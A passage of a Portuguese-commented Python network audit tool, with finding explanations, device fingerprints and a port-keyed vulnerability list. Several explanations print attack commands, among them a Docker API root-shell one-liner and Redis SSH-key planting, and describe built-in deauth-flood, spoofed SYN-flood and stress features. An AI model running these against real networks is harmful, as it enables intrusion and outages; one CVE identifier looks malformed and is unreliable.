    (r'(?i)(?:wpa[_-]?key|wifi[_-]?password|wlan[_-]?key)\s*[:=]\s*["\']?([^"\'\s<>]{8,63})',
     "PSK em chave/valor genérico"),
]

# ──────────── EXPLICAÇÕES DIDÁTICAS DOS ACHADOS ──────────────
# Cada chave descreve um TIPO de descoberta. Os relatórios injetam estes
# blocos para que o leitor (mesmo sem profundo conhecimento técnico)
# entenda: O QUE É, COMO VALIDAR, IMPACTO e exemplo do que foi encontrado.
EXPLICACOES: Dict[str, Dict[str, str]] = {
    # ── Inventário e descoberta ───────────────────────────────
    "inventario_hosts": {
        "titulo": "Inventário de Hosts",
        "resumo": (
            "Lista de todos os dispositivos detectados na rede. Cada host traz IP, "
            "MAC, vendor (fabricante via OUI), sistema operacional inferido, "
            "hostname, tipo de dispositivo (roteador, câmera, impressora, etc.), "
            "portas abertas e nível de confiança (0–100) baseado em quantas "
            "técnicas independentes confirmaram cada campo."),
        "como_validar": (
            "Cruze o IP com o roteador (página de clientes conectados). "
            "Confirme o MAC físicamente em equipamentos. Para hostname, faça "
            "ping pelo nome (`ping nome.local`). Para tipo de dispositivo, "
            "abra o IP no navegador e confira a interface."),
        "impacto": (
            "Saber TUDO que está na rede é o primeiro passo de qualquer auditoria. "
            "Dispositivos desconhecidos podem ser invasores ou IoT esquecido com "
            "firmware vulnerável. Hostname/MAC/vendor mostram quem é quem."),
    },
    # ── Vulnerabilidades por severidade ───────────────────────
    "vuln_critica": {
        "titulo": "Vulnerabilidade CRÍTICA",
        "resumo": (
            "Falha conhecida e explorável que permite execução remota de código, "
            "vazamento de dados em massa ou tomada total do dispositivo, sem "
            "autenticação ou com credenciais default."),
        "como_validar": (
            "Pegue o CVE indicado, busque no NIST NVD (nvd.nist.gov) e cruze a "
            "versão exata do serviço (banner) com a faixa vulnerável. "
            "Ferramentas como `searchsploit` mostram se há exploit público. "
            "NUNCA execute exploit sem autorização."),
        "impacto": (
            "Sem correção, é só questão de tempo até alguém entrar. Um atacante "
            "na mesma rede WiFi pode usar essa falha para virar root no "
            "dispositivo, sair pela rede interna e se mover lateralmente."),
    },
    "vuln_alta": {
        "titulo": "Vulnerabilidade ALTA",
        "resumo": (
            "Problema sério, mas que normalmente exige condição extra "
            "(autenticação, configuração específica, ou contato com o serviço)."),
        "como_validar": (
            "Confira o CVE e leia o `attack vector`: se for `network` e "
            "`unauthenticated`, trate como crítico. Se exige usuário logado, "
            "ainda é grave porque combina com phishing/creds default."),
        "impacto": (
            "Frequentemente usado em encadeamento (chain): atacante usa uma "
            "falha pequena para virar usuário, e essa falha alta para virar "
            "admin. Ignorar é dar meio caminho de graça."),
    },
    "vuln_media": {
        "titulo": "Vulnerabilidade MÉDIA",
        "resumo": (
            "Risco moderado: pode levar a vazamento parcial de informação, "
            "negação de serviço local, ou bypass de controles secundários."),
        "como_validar": (
            "Em ambiente de homologação, tente o cenário descrito no CVE. "
            "Se cair em produção, registre a versão e o patch level."),
        "impacto": (
            "Sozinho não derruba o dispositivo, mas dá ao atacante peças do "
            "quebra-cabeça (versões, paths internos) para preparar ataques "
            "mais sérios."),
    },
    "vuln_info": {
        "titulo": "Achado Informativo",
        "resumo": (
            "Não é uma falha em si — é uma exposição de informação que "
            "facilita reconhecimento (versão de servidor, headers ausentes, "
            "banners detalhados)."),
        "como_validar": (
            "Confira manualmente: `curl -I http://ip:porta` mostra os headers. "
            "Compare com baseline da sua organização."),
        "impacto": (
            "Cada peça de informação a mais que vaza ajuda o atacante a montar "
            "um perfil do alvo e escolher exploits específicos."),
    },
    # ── Portas/serviços expostos ──────────────────────────────
    "porta_telnet": {
        "titulo": "Telnet exposto (porta 23)",
        "resumo": (
            "Telnet é um protocolo de terminal remoto SEM CRIPTOGRAFIA. "
            "Qualquer usuário/senha digitado trafega em texto puro pela rede."),
        "como_validar": (
            "Abra um cliente Telnet (`telnet IP 23`). Se aparecer prompt de "
            "login, está aberto. Quem estiver na mesma rede WiFi pode ler "
            "tudo com `tcpdump` ou Wireshark."),
        "impacto": (
            "Alvo clássico do botnet Mirai e variantes. Combinado com "
            "credenciais padrão, vira acesso root em segundos. "
            "Nunca deveria estar aberto em rede moderna."),
    },
    "porta_ftp": {
        "titulo": "FTP exposto (porta 21)",
        "resumo": (
            "FTP transfere arquivos e credenciais SEM CRIPTOGRAFIA. "
            "Muitos servidores FTP têm também a opção `anonymous` que dispensa senha."),
        "como_validar": (
            "Tente `ftp IP` e use usuário `anonymous` com senha vazia. "
            "Se entrar, a pasta está pública. Se pedir senha, ainda é grave "
            "porque trafega em texto puro."),
        "impacto": (
            "Vazamento de arquivos sensíveis (backups, configs) e captura "
            "trivial de credenciais por sniffing. Substitua por SFTP (porta 22)."),
    },
    "porta_smb": {
        "titulo": "SMB exposto (porta 445/139)",
        "resumo": (
            "SMB compartilha arquivos e impressoras em redes Windows. "
            "Versões antigas (SMB1) têm falhas críticas como EternalBlue (WannaCry)."),
        "como_validar": (
            "No Windows: `nmap -p445 --script smb-protocols IP` mostra dialeto. "
            "Se SMB1 ativo, é EternalBlue (CVE-2017-0144). "
            "Em Linux: `smbclient -L //IP` lista compartilhamentos."),
        "impacto": (
            "EternalBlue/SMBGhost permitem RCE remoto sem credenciais — usado "
            "por ransomware (WannaCry, NotPetya) que destruiu hospitais e "
            "fábricas. Exposto em rede WiFi pública é fim de jogo."),
    },
    "porta_rdp": {
        "titulo": "RDP exposto (porta 3389)",
        "resumo": (
            "Remote Desktop Protocol: controle gráfico remoto de Windows. "
            "Alvo número 1 de ransomware desde 2018."),
        "como_validar": (
            "Conecte via cliente RDP (mstsc no Windows, Remmina no Linux). "
            "Se mostra tela de login, está aberto. Verifique se NLA (Network "
            "Level Authentication) está obrigatório."),
        "impacto": (
            "BlueKeep (CVE-2019-0708) permite RCE pré-autenticação. "
            "Exposição na internet ou WiFi convidado leva a brute-force "
            "automatizado e infecção por ransomware. NUNCA deve estar exposto."),
    },
    "porta_rtsp": {
        "titulo": "RTSP exposto (porta 554)",
        "resumo": (
            "Real-Time Streaming Protocol: usado por câmeras IP para "
            "transmitir vídeo. Frequentemente sem autenticação adequada."),
        "como_validar": (
            "Use VLC Media Player → Mídia → Abrir Fluxo de Rede → "
            "`rtsp://IP/live`. Se o vídeo aparecer, qualquer um na rede "
            "está vendo o feed da câmera."),
        "impacto": (
            "Acesso ao stream de câmeras de segurança/babá/empresas. "
            "Bancos de dados públicos (Insecam) listam câmeras expostas em "
            "tempo real. Violação de privacidade óbvia."),
    },
    "porta_snmp": {
        "titulo": "SNMP exposto (porta 161)",
        "resumo": (
            "Simple Network Management Protocol: protocolo de gerência usado "
            "por switches, roteadores e impressoras. Frequentemente com "
            "community 'public' (read) ou 'private' (read+write) padrão."),
        "como_validar": (
            "`snmpwalk -v1 -c public IP` lista informações do dispositivo. "
            "Se retornar dados, community está aceita. Tente também `private`."),
        "impacto": (
            "Com 'public' o atacante mapeia tudo (interfaces, processos, "
            "tabelas de roteamento). Com 'private' pode RECONFIGURAR o "
            "dispositivo (mudar rotas, derrubar interfaces, criar usuários). "
            "Também é usado em ataques de amplificação DDoS (~600x)."),
    },
    "porta_dns": {
        "titulo": "DNS exposto (porta 53)",
        "resumo": (
            "Servidor DNS aberto. Se for recursivo (responde queries para "
            "domínios externos), pode ser abusado em ataques de amplificação."),
        "como_validar": (
            "`dig @IP google.com` — se responder com IP do Google, é recursivo "
            "aberto. `dig @IP version.bind chaos txt` retorna versão do BIND."),
        "impacto": (
            "Resolvers abertos são usados em ataques DDoS de amplificação "
            "(query pequena → resposta grande, refletida na vítima). "
            "Coloca o ISP do dono na lista negra. Atacantes também enxergam "
            "padrões de navegação interna."),
    },
    "porta_ntp": {
        "titulo": "NTP exposto (porta 123)",
        "resumo": (
            "Network Time Protocol: sincroniza relógios. Versões antigas "
            "respondem ao comando `monlist` que retorna até 600 IPs por query."),
        "como_validar": (
            "`ntpdc -n -c monlist IP` ou `nmap -sU -pU:123 --script ntp-monlist IP`. "
            "Se retornar lista de hosts, está vulnerável a amplificação."),
        "impacto": (
            "Amplificação NTP foi usada em DDoS de 400 Gbps (Cloudflare 2014). "
            "Servidor vira arma contra terceiros. Atualizar para ntpd ≥ 4.2.7p26 "
            "ou desabilitar monlist resolve."),
    },
    "porta_redis": {
        "titulo": "Redis exposto (porta 6379)",
        "resumo": (
            "Banco de dados em memória. Por padrão, vem SEM autenticação."),
        "como_validar": (
            "`redis-cli -h IP -p 6379` → comando `INFO` lista versão e dados. "
            "Se conectar sem senha, está aberto."),
        "impacto": (
            "Sem auth, atacante lê/escreve TUDO. Pior: comando `CONFIG SET` "
            "permite gravar arquivo arbitrário no disco — usado para escrever "
            "chave SSH em /root/.ssh/authorized_keys e ganhar shell remoto."),
    },
    "porta_mongo": {
        "titulo": "MongoDB exposto (porta 27017)",
        "resumo": (
            "Banco NoSQL. Versões < 3.6 vinham sem autenticação por padrão. "
            "Causa anual de vazamentos massivos de dados."),
        "como_validar": (
            "`mongo --host IP --port 27017` → comando `show dbs`. Se listar "
            "bancos, está sem auth. Acesso aos dados é trivial."),
        "impacto": (
            "Vazamentos de centenas de milhões de registros já aconteceram "
            "(MyHeritage 92M, MongoDB ransom 2017). Atacante lê, copia "
            "e/ou apaga e exige resgate em Bitcoin."),
    },
    "porta_elastic": {
        "titulo": "Elasticsearch exposto (porta 9200)",
        "resumo": (
            "Mecanismo de busca/log analítico. Histórico ruim de exposição "
            "pública sem auth (X-Pack era pago até 2018)."),
        "como_validar": (
            "`curl http://IP:9200/_cat/indices` lista todos os índices. "
            "Se responder, está sem auth."),
        "impacto": (
            "Vazamento de logs de aplicação, dados de clientes, métricas "
            "internas. Atacante pode também apagar todos os índices."),
    },
    "porta_docker": {
        "titulo": "Docker API exposta (porta 2375)",
        "resumo": (
            "API de gerência do Docker SEM TLS. Permite criar/parar/inspecionar "
            "containers remotamente."),
        "como_validar": (
            "`curl http://IP:2375/version` ou `docker -H tcp://IP:2375 ps`. "
            "Se responder, é jogo perdido."),
        "impacto": (
            "RCE trivial: `docker -H tcp://IP:2375 run -v /:/host alpine "
            "chroot /host` dá shell root no HOST. Equivale a entregar a chave "
            "do servidor para qualquer um na rede."),
    },
    # ── Vazamentos de segredos ────────────────────────────────
    "secret_leak": {
        "titulo": "Segredo vazado em arquivo público",
        "resumo": (
            "Um arquivo que normalmente fica nos bastidores (.env, .git/config, "
            "backup.sql, id_rsa, .aws/credentials) está acessível por HTTP — "
            "e o conteúdo bate com padrões de credenciais reais."),
        "como_validar": (
            "Abra a URL no navegador (`http://IP:porta/PATH`). Se retornar o "
            "conteúdo do arquivo (não erro 404), o vazamento é real. "
            "Procure por strings como `password=`, `BEGIN PRIVATE KEY`, "
            "`AWS_SECRET_ACCESS_KEY=AKIA...`."),
        "impacto": (
            "Acesso direto a banco de dados, API privada, conta AWS, Git "
            "interno, etc. Em segundos o atacante tem credenciais válidas "
            "para se mover lateralmente. Cenário real: GitHub.com já bloqueou "
            "milhões de tokens AWS vazados."),
    },
    "psk_exposto": {
        "titulo": "Senha WiFi (PSK) exposta em página HTML/JS",
        "resumo": (
            "Roteadores antigos (e alguns novos com firmware ruim) renderizam "
            "a senha WiFi em texto puro dentro do HTML/JavaScript da página "
            "de status — sem autenticação ou com auth contornável."),
        "como_validar": (
            "Abra a URL no navegador, depois Ctrl+U (ver código-fonte). "
            "Procure por `wifiKey`, `wpaKey`, `pskValue`, `wpaPassphrase`. "
            "Se a senha aparece, basta copiar."),
        "impacto": (
            "Atacante na faixa do WiFi (corredor, vizinho) entra na rede e, "
            "uma vez dentro, está atrás do firewall. Vê tráfego, ataca "
            "dispositivos internos, usa a internet do alvo."),
    },
    "snmp_community_extra": {
        "titulo": "SNMP — community não-padrão aceita",
        "resumo": (
            "Além do clássico 'public' (somente leitura), o dispositivo "
            "aceitou outra community (private/cisco/admin/...). 'private' "
            "tradicionalmente dá permissão de ESCRITA via SNMP."),
        "como_validar": (
            "`snmpwalk -v1 -c <community> IP` lista dados. Se retornar, "
            "tente `snmpset` na mesma community para ver se escreve."),
        "impacto": (
            "Com community de escrita, atacante reconfigura o equipamento: "
            "cria usuários, muda rotas, abre portas, derruba interfaces. "
            "Em switches gerenciados é jogo perdido — controla a rede inteira."),
    },
    "creds_padrao": {
        "titulo": "Credenciais padrão prováveis (informativo)",
        "resumo": (
            "Identificamos o fabricante/modelo do dispositivo via fingerprint "
            "web ou MAC OUI. Cruzamos com nosso banco de credenciais default "
            "deste fabricante. NÃO testamos login — é só uma sugestão."),
        "como_validar": (
            "Abra o painel de login no navegador e tente os pares listados. "
            "Confirme com a documentação do modelo. Se funcionou, troque a "
            "senha IMEDIATAMENTE."),
        "impacto": (
            "75% dos dispositivos IoT/roteadores residenciais nunca tiveram "
            "a senha padrão trocada. Atacante automatizado (Mirai) testa "
            "essas combinações em segundos. Trocar a senha é o controle "
            "mais barato e eficaz."),
    },
    # ── Amplificação ──────────────────────────────────────────
    "amplificacao": {
        "titulo": "Serviço vulnerável a amplificação DDoS",
        "resumo": (
            "Serviços UDP (DNS, NTP, SNMP, Memcached, SSDP) permitem que "
            "uma query pequena gere uma resposta gigante. Atacante envia "
            "queries com IP de origem falsificado para a vítima, e o "
            "serviço joga a resposta na vítima."),
        "como_validar": (
            "Em redes monitoradas, observe se o tráfego de saída deste IP "
            "aumenta drasticamente sem motivo aparente. Para teste manual, "
            "use ferramentas como `mfx` ou `dnsperf` em ambiente isolado."),
        "impacto": (
            "Mesmo que o dono não seja o alvo, o servidor vira ARMA. "
            "ISPs colocam IPs assim em listas negras. Em ataques recordes "
            "(GitHub 2018, 1.35 Tbps via Memcached) milhares de servidores "
            "abertos foram usados como amplificadores."),
    },
    # ── Paths e exposições web ────────────────────────────────
    "path_default": {
        "titulo": "Painel administrativo / path default acessível",
        "resumo": (
            "Caminhos como /phpmyadmin, /wp-admin, /manager/html ou "
            "/server-status estão acessíveis via HTTP — alvos clássicos "
            "de força-bruta e exploits específicos."),
        "como_validar": (
            "Abra a URL e veja se aparece tela de login ou status do servidor. "
            "Se sim, o painel está exposto. Verifique se exige autenticação "
            "forte e se está atrás de VPN/whitelist."),
        "impacto": (
            "Painéis expostos sofrem brute-force 24/7 por bots automatizados. "
            "Combinado com creds default, é arrombamento. /server-status "
            "do Apache vaza requisições em andamento (incluindo URLs com "
            "tokens em GET)."),
    },
    "headers_seguranca": {
        "titulo": "Headers de segurança HTTP ausentes",
        "resumo": (
            "Headers como X-Frame-Options, Content-Security-Policy e HSTS "
            "instruem o navegador a aplicar proteções (bloquear iframe, "
            "limitar scripts, forçar HTTPS). Ausência facilita XSS, "
            "clickjacking e downgrade attacks."),
        "como_validar": (
            "`curl -I https://IP:porta` mostra os headers. Cruze com "
            "https://securityheaders.com (avalia gratuitamente)."),
        "impacto": (
            "Sozinho não é exploit — é falta de defesa em profundidade. "
            "Combinado com XSS no app, vira sequestro de sessão. "
            "Combinado com phishing, vira clickjacking."),
    },
    "ssh_versao_antiga": {
        "titulo": "OpenSSH versão antiga",
        "resumo": (
            "Servidor SSH com versão antiga, sujeita a CVEs conhecidas como "
            "user enumeration (CVE-2018-15473, OpenSSH < 7.7)."),
        "como_validar": (
            "`ssh -V` no servidor mostra versão. `ssh user@IP` no cliente "
            "mostra banner. Cruze com NIST NVD pelo CVE listado."),
        "impacto": (
            "User enumeration permite descobrir nomes válidos, viabilizando "
            "brute-force direcionado. Versões muito antigas têm falhas mais "
            "graves (RCE pré-auth em SSH < 4.x)."),
    },
    # ── Honeypot (futura) ─────────────────────────────────────
    "honeypot": {
        "titulo": "Possível honeypot detectado",
        "resumo": (
            "Honeypot é um dispositivo armadilha: simula vulnerabilidades "
            "para atrair atacantes e estudar comportamento. Indicadores: "
            "muitas portas abertas em sequência, banners idênticos, "
            "respostas absurdamente rápidas (<1ms), TTL inconsistente."),
        "como_validar": (
            "Compare a latência de portas vs ping ICMP. Verifique se "
            "banners distintos respondem com texto idêntico. Procure "
            "padrões irreais (todas as 65535 portas abertas)."),
        "impacto": (
            "Continuar atacando um honeypot expõe TÁTICAS e ferramentas do "
            "atacante para o defensor. Em pentest legítimo, evita perder "
            "tempo investigando rede falsa."),
    },
    # ── Stress / Resiliência ──────────────────────────────────
    "godfall_resultado": {
        "titulo": "Godfall — Benchmark de resiliência",
        "resumo": (
            "Teste de stress controlado em 4 fases (VANGUARD → SIEGE → "
            "OVERDRIVE → TITANFALL) que mede como cada host se comporta "
            "sob carga crescente: TCP connects, HTTP bursts e barragem "
            "UDP multi-thread em paralelo."),
        "como_validar": (
            "Reproduza a tabela de fases: cada uma aumenta o multiplier e "
            "concorrência. Compare a taxa de sucesso (%) e a latência de "
            "ping ao gateway durante o teste. Hosts que caem para <20% "
            "de sucesso na fase OVERDRIVE são frágeis."),
        "impacto": (
            "Mostra a capacidade real da rede sob ataque ou tráfego de pico. "
            "Identifica dispositivos que travam fácil (IoT antigo, "
            "roteadores residenciais) e que precisam ser substituídos ou "
            "isolados antes de eventos de carga (live, festa, Black Friday)."),
    },
    # ── Modo Root e técnicas privilegiadas ────────────────────
    "privilegio_root": {
        "titulo": "Modo Root (--root) — Auditoria Apex",
        "resumo": (
            "Quando ativo, troca técnicas user-space por raw sockets, scapy, "
            "binários nativos privilegiados (aireplay-ng, mdk4, tcpdump, "
            "nmap como root) e telemetria de kernel. Detecta SO automaticamente: "
            "Windows Admin → motor 'adm'; Linux como root → 'root-kali'; "
            "Termux com su → 'root-termux'."),
        "como_validar": (
            "Cheque o banner 'PRIVILEGE MODE ATIVADO' no boot — ele lista o motor "
            "detectado e as capabilities disponíveis. Em Linux: `id` deve retornar "
            "uid=0. Em Windows: PowerShell/cmd como Admin. Sem privilégio, --root "
            "recusa explicitamente com instruções."),
        "impacto": (
            "ARP active sweep ~10x mais rápido que ping; SYN scan stealth não "
            "loga em syslog do alvo; SNMP testa wordlist 40+; godfall com "
            "concorrência 1024 e SYN flood spoofed via scapy. Capacidade total "
            "do tooling fica ~3-5x maior — comparável a Kali/nmap em modo SYN."),
    },
    "arp_spoofing_detect": {
        "titulo": "ARP Spoofing detectado (passivo)",
        "resumo": (
            "Durante 10s, capturamos pacotes ARP via tcpdump. Se o mesmo IP "
            "responde com MACs DIFERENTES em um curto intervalo, alguém está "
            "fazendo gratuitous ARP — clássico man-in-the-middle (MITM) na LAN."),
        "como_validar": (
            "Em outra shell: `tcpdump -i any -n arp` por 30s. Cruze o IP "
            "suspeito com a tabela ARP do roteador (`arp -a` no roteador). "
            "Se o MAC do roteador estiver associado a outro IP de cliente, "
            "MITM confirmado."),
        "impacto": (
            "Atacante intercepta TODO o tráfego entre vítima e gateway. Pode "
            "ler senhas em texto puro, fazer SSL strip, injetar conteúdo. "
            "Ferramentas: ettercap, bettercap. Mitigação: ARP estático no "
            "switch/AP (Dynamic ARP Inspection)."),
    },
    "lldp_cdp": {
        "titulo": "LLDP/CDP exposto",
        "resumo": (
            "Link Layer Discovery Protocol (LLDP) e Cisco Discovery Protocol "
            "(CDP) são frames multicast que switches/routers enviam regularmente "
            "expondo modelo, versão de firmware, porta física, VLAN, capabilities."),
        "como_validar": (
            "`tcpdump -i any -nn -e ether host 01:80:c2:00:00:0e or ether "
            "host 01:00:0c:cc:cc:cc -c 5` em rede com switch gerenciado mostra "
            "frames LLDP. Wireshark dissecca melhor (filtro `lldp || cdp`)."),
        "impacto": (
            "Atacante mapeia toda topologia interna sem nenhum scan. Vê switch "
            "stack, VLANs disponíveis, portas físicas — base para VLAN hopping, "
            "STP attack, ataques direcionados. Solução: desabilitar LLDP/CDP "
            "em portas de acesso (manter só em uplinks entre switches)."),
    },
    "dns_snooping": {
        "titulo": "DNS Cache Snooping",
        "resumo": (
            "Enviamos queries com flag RD=0 (não-recursivo) para domínios "
            "populares (google.com, facebook.com). Se o servidor responde com "
            "ANCOUNT>0, é porque tem o domínio em cache — alguém daquela rede "
            "acessou recentemente."),
        "como_validar": (
            "`dig @IP google.com +norecurse` — se retornar IP, está cacheado. "
            "Repita para vários domínios e cruze. Se um padrão aparece "
            "(somente sites de banco X), você infere que o usuário é cliente "
            "daquele banco."),
        "impacto": (
            "Vazamento passivo de hábitos de navegação dos usuários da rede. "
            "Pode ser usado para profiling em ataques direcionados (spear "
            "phishing). Solução: desabilitar resolver recursivo público ou "
            "exigir autenticação."),
    },
    "kamikase": {
        "titulo": "Kamikase — Deauth Flood 802.11",
        "resumo": (
            "Stress 802.11 que envia frames Management de Deauthentication "
            "para todos os APs visíveis em loop infinito até Ctrl+C. Frame "
            "com src=BSSID e dst=ff:ff:ff:ff:ff:ff força TODOS os clientes "
            "associados a se reconectarem. Em alta taxa, derruba a rede."),
        "como_validar": (
            "Em outra máquina, observe o WiFi: clientes desconectam "
            "constantemente, ícone fica 'reconectando'. Em Wireshark "
            "(monitor mode em outra placa), filtro `wlan.fc.type_subtype "
            "== 0x0c` mostra deauth frames. Confira `kamikase_audit.log`."),
        "impacto": (
            "Para teste autorizado: mostra resiliência da rede, identifica "
            "se há rogue AP detection, força clientes a re-handshake (útil "
            "para captura WPA). Sem autorização: CRIME (Lei 12.737/2012 BR; "
            "CFAA EUA). Defesa: 802.11w (Management Frame Protection)."),
    },
}
# Assinaturas para classificação por title/server/body em respostas HTTP
DEVICE_FINGERPRINTS = [
    # Roteadores domésticos
    {"vendor": "TP-Link",      "marker": "tp-link",      "tipo": "roteador"},
    {"vendor": "TP-Link",      "marker": "tplinkwifi",   "tipo": "roteador"},
    {"vendor": "ASUS",         "marker": "asuswrt",      "tipo": "roteador"},
    {"vendor": "ASUS",         "marker": "rt-ax",        "tipo": "roteador"},
    {"vendor": "D-Link",       "marker": "d-link",       "tipo": "roteador"},
    {"vendor": "Linksys",      "marker": "linksys",      "tipo": "roteador"},
    {"vendor": "Netgear",      "marker": "netgear",      "tipo": "roteador"},
    {"vendor": "Tenda",        "marker": "tenda",        "tipo": "roteador"},
    {"vendor": "Xiaomi",       "marker": "miwifi",       "tipo": "roteador"},
    {"vendor": "Xiaomi",       "marker": "xiaomi",       "tipo": "roteador"},
    {"vendor": "ZTE",          "marker": "zte",          "tipo": "roteador"},
    {"vendor": "Huawei",       "marker": "huawei",       "tipo": "roteador"},
    {"vendor": "Intelbras",    "marker": "intelbras",    "tipo": "roteador"},
    {"vendor": "MikroTik",     "marker": "routeros",     "tipo": "roteador"},
    {"vendor": "MikroTik",     "marker": "mikrotik",     "tipo": "roteador"},
    {"vendor": "Ubiquiti",     "marker": "edgeos",       "tipo": "roteador"},
    {"vendor": "Ubiquiti",     "marker": "unifi",        "tipo": "roteador"},
    {"vendor": "Ubiquiti",     "marker": "airos",        "tipo": "roteador"},
    {"vendor": "Cisco",        "marker": "cisco",        "tipo": "roteador"},
    {"vendor": "Aruba",        "marker": "aruba",        "tipo": "roteador"},
    {"vendor": "Ruckus",       "marker": "ruckus",       "tipo": "roteador"},
    {"vendor": "pfSense",      "marker": "pfsense",      "tipo": "roteador"},
    {"vendor": "OpenWrt",      "marker": "openwrt",      "tipo": "roteador"},
    # Câmeras IP / NVRs
    {"vendor": "Hikvision",    "marker": "hikvision",    "tipo": "camera_ip"},
    {"vendor": "Hikvision",    "marker": "ds-",          "tipo": "camera_ip"},
    {"vendor": "Dahua",        "marker": "dahua",        "tipo": "camera_ip"},
    {"vendor": "Dahua",        "marker": "webservice",   "tipo": "camera_ip"},
    {"vendor": "Axis",         "marker": "axis",         "tipo": "camera_ip"},
    {"vendor": "Foscam",       "marker": "foscam",       "tipo": "camera_ip"},
    {"vendor": "Amcrest",      "marker": "amcrest",      "tipo": "camera_ip"},
    {"vendor": "Reolink",      "marker": "reolink",      "tipo": "camera_ip"},
    {"vendor": "Wyze",         "marker": "wyze",         "tipo": "camera_ip"},
    {"vendor": "Tuya",         "marker": "tuya",         "tipo": "iot_generico"},
    {"vendor": "Genérico",     "marker": "ipcamera",     "tipo": "camera_ip"},
    # NAS
    {"vendor": "Synology",     "marker": "synology",     "tipo": "nas"},
    {"vendor": "Synology",     "marker": "diskstation",  "tipo": "nas"},
    {"vendor": "QNAP",         "marker": "qnap",         "tipo": "nas"},
    {"vendor": "QNAP",         "marker": "qts",          "tipo": "nas"},
    {"vendor": "TrueNAS",      "marker": "truenas",      "tipo": "nas"},
    {"vendor": "TrueNAS",      "marker": "freenas",      "tipo": "nas"},
    # Impressoras
    {"vendor": "HP",           "marker": "hp laserjet",  "tipo": "impressora"},
    {"vendor": "HP",           "marker": "hp officejet", "tipo": "impressora"},
    {"vendor": "Epson",        "marker": "epson",        "tipo": "impressora"},
    {"vendor": "Brother",      "marker": "brother",      "tipo": "impressora"},
    {"vendor": "Canon",        "marker": "canon",        "tipo": "impressora"},
    # VoIP
    {"vendor": "Grandstream",  "marker": "grandstream",  "tipo": "voip"},
    # Servidores web comuns
    {"vendor": "Apache",       "marker": "apache",       "tipo": "linux_servidor"},
    {"vendor": "nginx",        "marker": "nginx",        "tipo": "linux_servidor"},
    {"vendor": "lighttpd",     "marker": "lighttpd",     "tipo": "linux_servidor"},
    {"vendor": "IIS",          "marker": "iis",          "tipo": "windows_pc"},
    {"vendor": "GoAhead",      "marker": "goahead",      "tipo": "iot_generico"},
    {"vendor": "Boa",          "marker": "boa/",         "tipo": "iot_generico"},
    {"vendor": "Mongoose",     "marker": "mongoose",     "tipo": "iot_generico"},
]

# ──────────── Banco de Vulnerabilidades (passivo) ────────────
# Para cada porta: lista de assinaturas {servico, regex_banner, dica_cve, severidade}.
# Severidades: critica, alta, media, info. Tudo heurístico — sem exploit.
VULN_DB: Dict[int, List[Dict[str, Any]]] = {
    21: [
        {"servico": "ftp", "regex": r"ProFTPD\s*1\.3\.3c",
         "dica": "ProFTPD 1.3.3c — backdoor (CVE-2010-15)", "severidade": "critica"},
        {"servico": "ftp", "regex": r"vsftpd\s*2\.3\.4",
         "dica": "vsftpd 2.3.4 — backdoor smiley (CVE-2011-2523)", "severidade": "critica"},
        {"servico": "ftp", "regex": r"(?i)anonymous",
         "dica": "FTP anônimo possivelmente habilitado", "severidade": "media"},
        {"servico": "ftp", "regex": r".*",
         "dica": "FTP em texto puro — credenciais expostas em sniffing", "severidade": "media"},
    ],
    22: [
        {"servico": "ssh", "regex": r"OpenSSH_([0-6]\.|7\.[0-6])",
         "dica": "OpenSSH < 7.7 — user enumeration (CVE-2018-15473)", "severidade": "alta"},
        {"servico": "ssh", "regex": r"OpenSSH_5\.",
         "dica": "OpenSSH 5.x — múltiplos CVEs, fim de suporte", "severidade": "alta"},
        {"servico": "ssh", "regex": r"dropbear",
         "dica": "Dropbear comum em IoT — verificar versão e creds default", "severidade": "info"},
    ],
    23: [
        {"servico": "telnet", "regex": r".*",
         "dica": "Telnet em texto puro — alvo clássico Mirai", "severidade": "alta"},
    ],
    25: [
        {"servico": "smtp", "regex": r"(?i)open relay|relay=ok",
         "dica": "SMTP open relay — possível abuso para spam", "severidade": "alta"},
        {"servico": "smtp", "regex": r".*",
         "dica": "SMTP exposto — verificar STARTTLS e autenticação", "severidade": "info"},
    ],
    53: [
        {"servico": "dns", "regex": r".*",
         "dica": "DNS exposto — verificar recursão aberta (amplificação)", "severidade": "media"},
    ],
    80: [
        {"servico": "http", "regex": r"Apache/(1\.|2\.0|2\.2)",
         "dica": "Apache antigo — múltiplos CVEs históricos", "severidade": "alta"},
        {"servico": "http", "regex": r"nginx/0\.|nginx/1\.[0-9]\b",
         "dica": "nginx < 1.10 — possíveis CVEs", "severidade": "media"},
        {"servico": "http", "regex": r"Microsoft-IIS/[5-7]",
         "dica": "IIS legado (≤7.x) — CVEs conhecidos", "severidade": "alta"},
    ],
    111: [
        {"servico": "rpcbind", "regex": r".*",
         "dica": "rpcbind exposto — usado em ataques de amplificação", "severidade": "alta"},
    ],
    123: [
        {"servico": "ntp", "regex": r".*",
         "dica": "NTP exposto — verificar monlist (amplificação)", "severidade": "media"},
    ],
    139: [
        {"servico": "netbios", "regex": r".*",
         "dica": "NetBIOS exposto — alvo SMBv1 / null session", "severidade": "alta"},
    ],
    161: [
        {"servico": "snmp", "regex": r".*",
         "dica": "SNMP exposto — verificar community public/private", "severidade": "alta"},
    ],
    443: [
        {"servico": "https", "regex": r"OpenSSL/1\.0\.1",
         "dica": "OpenSSL 1.0.1 — Heartbleed (CVE-2014-0160)", "severidade": "critica"},
        {"servico": "https", "regex": r"Apache/(1\.|2\.0|2\.2)",
         "dica": "Apache antigo (HTTPS) — auditoria de versão", "severidade": "alta"},
    ],
    445: [
        {"servico": "smb", "regex": r".*",
         "dica": "SMB exposto — CVE-2017-0144 EternalBlue / CVE-2020-0796 SMBGhost",
         "severidade": "critica"},
    ],
    554: [
        {"servico": "rtsp", "regex": r".*",
         "dica": "RTSP exposto — checar autenticação na URL", "severidade": "media"},
    ],
    1433: [
        {"servico": "mssql", "regex": r".*",
         "dica": "MSSQL exposto — sa fraco / CVE-2020-0618", "severidade": "alta"},
    ],
    1900: [
        {"servico": "upnp", "regex": r".*",
         "dica": "UPnP/SSDP exposto — amplificação e CallStranger (CVE-2020-12695)",
         "severidade": "alta"},
    ],
    2049: [
        {"servico": "nfs", "regex": r".*",
         "dica": "NFS exposto — verificar exports anônimos", "severidade": "alta"},
    ],
    2375: [
        {"servico": "docker", "regex": r".*",
         "dica": "Docker API sem TLS — RCE trivial se exposto", "severidade": "critica"},
    ],
    3306: [
        {"servico": "mysql", "regex": r".*",
         "dica": "MySQL exposto — root sem senha é comum em IoT/dev", "severidade": "alta"},
    ],
    3389: [
        {"servico": "rdp", "regex": r".*",
         "dica": "RDP exposto — BlueKeep (CVE-2019-0708)", "severidade": "critica"},
    ],
    5432: [
        {"servico": "postgres", "regex": r".*",
